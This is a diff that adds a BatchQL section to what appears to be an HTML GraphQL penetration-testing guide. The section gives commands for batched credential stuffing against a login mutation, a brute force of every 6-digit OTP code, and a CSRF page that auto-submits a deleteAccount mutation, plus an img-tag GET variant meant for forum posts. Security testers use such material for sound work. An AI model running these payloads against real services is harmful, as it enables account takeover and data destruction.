@@ -145,8 +145,116 @@ wscat -c wss://target/graphql \
 
 # IDOR in subscriptions — subscribe to another user's notifications</code></pre>
 
+  <h2>BatchQL — GraphQL Batch Attack Tool</h2>
+  <p>BatchQL is a Python CLI tool that automates GraphQL security checks: it probes for introspection, schema suggestions, CSRF weaknesses, query-name batching support, and JSON list batching support — then uses those findings to launch wordlist-based batch attacks (e.g., credential stuffing against a login mutation). Each batch bundles N requests into a single HTTP call, bypassing per-request rate limits.</p>
+
+  <h3>Installation</h3>
+  <pre><code>git clone https://github.com/assetnote/batchql
+cd batchql
+pip3 install -r requirements.txt</code></pre>
+
+  <h3>Preflight — Security Checks</h3>
+  <pre><code"># BatchQL runs 5 automated checks before launching attacks.
+# All checks are performed on every run — no flags required.
+
+python3 batch.py -e https://target/graphql
+
+# Checks performed:
+# 1. Introspection enabled?          → dumps __schema if yes
+# 2. Schema suggestions enabled?     → sends a typo field, checks "Did you mean" in response
+# 3. CSRF via GET request?            → sends introspection as a GET; checks for 200 + data
+# 4. CSRF via POST (no Content-Type)? → sends bare POST; checks for 200 + data
+# 5. Query name batching supported?  → sends [{"operationName":"a",...},{"operationName":"b",...}]
+#                                       checks whether both responses are returned
+# 6. JSON list batching supported?   → sends [query1, query2]; checks for array response
+
+# Example output:
+# [+] Introspection: ENABLED
+# [+] Schema suggestions: ENABLED
+# [-] CSRF via GET: NOT vulnerable
+# [+] CSRF via POST (no Content-Type): VULNERABLE
+# [+] Query name batching: SUPPORTED
+# [+] JSON list batching: SUPPORTED</code></pre>
+
+  <h3>Batch Attack — Wordlist-Based Credential Stuffing</h3>
+  <pre><code"># Use #VARIABLE# as the placeholder in your query/variables file.
+# BatchQL substitutes each wordlist entry in batches of N (default 10).
+
+# Step 1: Write a query file (query.graphql) with the target mutation:
+cat query.graphql
+# mutation { login(password: "#VARIABLE#") { token } }
+
+# Step 2: Launch batch attack:
+python3 batch.py \
+  -e https://target/graphql \
+  -q query.graphql \
+  -w /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt \
+  -s 100        # batch size: 100 queries per HTTP request
+
+# Or use a variables JSON file (cleaner for complex queries):
+cat variables.json
+# { "password": "#VARIABLE#", "username": "admin" }
+
+python3 batch.py \
+  -e https://target/graphql \
+  -q query.graphql \
+  -v variables.json \
+  -w /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt \
+  -s 50
+
+# Full flag reference:
+# -e  endpoint URL (required)
+# -q  query file containing #VARIABLE# placeholder
+# -v  variables JSON file containing #VARIABLE# placeholder
+# -w  wordlist file (one entry per line)
+# -s  batch size (queries per HTTP request, default 10)
+# -p  HTTP proxy (e.g., http://127.0.0.1:8080 for Burp)
+# -H  extra header (e.g., -H "Authorization: Bearer TOKEN")
+# -o  output file (writes full responses)</code></pre>
+
+  <h3>OTP / 2FA Brute Force via Batching</h3>
+  <pre><code"># Generate all 6-digit OTP values and batch them:
+python3 -c "
+for i in range(1000000):
+    print(str(i).zfill(6))
+" > otp.txt
+
+# Query that submits an OTP:
+cat otp_query.graphql
+# mutation { verifyOtp(code: \"#VARIABLE#\") { verified token } }
+
+# 1M codes in batches of 1000 = 1000 HTTP requests (vs 1M individual):
+python3 batch.py \
+  -e https://target/graphql \
+  -q otp_query.graphql \
+  -w otp.txt \
+  -s 1000 \
+  -o otp_results.txt
+
+# Parse results for successful verification:
+grep -i '"verified":true' otp_results.txt</code></pre>
+
+  <h3>CSRF Exploitation via BatchQL</h3>
+  <pre><code"># If BatchQL reports CSRF via POST (no Content-Type): VULNERABLE,
+# the GraphQL endpoint accepts requests without a CSRF token or correct Content-Type.
+
+# Exploit: craft an HTML form that auto-submits a mutation:
+cat &lt;&lt;'EOF' &gt; csrf.html
+&lt;html&gt;&lt;body&gt;&lt;script&gt;
+fetch("https://target/graphql", {
+  method: "POST",
+  body: JSON.stringify({query: "mutation { deleteAccount { success } }"}),
+  credentials: "include"
+});
+&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;
+EOF
+
+# If CSRF via GET is flagged: introspection (and potentially mutations) run over GET
+# Deliver as &lt;img src="https://target/graphql?query=mutation{...}"&gt; in a forum post</code></pre>
+
   <h2>Tools &amp; Resources</h2>
   <ul>
+    <li>BatchQL — <code>github.com/assetnote/batchql</code></li>
     <li>InQL (Burp + CLI) — <code>github.com/doyensec/inql</code></li>
     <li>graphql-cop — <code>github.com/dolevf/graphql-cop</code></li>
     <li>GraphQL Voyager — schema visualizer</li>
